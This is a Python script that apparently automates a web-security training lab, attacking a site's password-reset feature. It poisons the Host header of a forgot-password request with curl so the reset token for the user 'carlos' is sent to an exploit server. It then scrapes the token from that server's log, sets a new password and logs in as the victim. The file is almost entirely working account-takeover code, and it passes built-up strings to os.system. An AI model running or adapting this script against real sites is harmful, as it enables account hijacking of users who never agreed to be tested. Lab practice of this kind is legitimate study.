import re
import os
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
reset_url = burp_url + '/forgot-password'
reset_last_part = reset_url + '?temp-forgot-password-token='


session = requests.Session()

response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

cookies = response.cookies
cookies_dict = requests.utils.dict_from_cookiejar(cookies)
cookies_header = '; '.join([f"{key}={value}" for key, value in cookies_dict.items()])
cookies_header = cookies_header

response = session.get(reset_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)


command = f"curl --path-as-is  -k -X POST -H 'Host: {exploit_server[8:]}' --data-binary 'csrf={csrf}&username=carlos' '{burp_url}/forgot-password' -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0' -H 'Cookie: {cookies_header}'"

os.system(command)

exploit_log = exploit_server + '/log'
response = session.get(exploit_log)
match = re.search(r'=([0-9a-zA-Z]{32})', response.text)
reset_token = match.group(1)
response = session.get(reset_last_part + reset_token)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "temp-forgot-password-token": reset_token, "new-password-1": "1111111", "new-password-2": "1111111"}
session.post(reset_last_part, data=burp_data)

response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)
burp_data = {"csrf": csrf, "username": "carlos", "password": "1111111"}
session.post(login_url, burp_data)
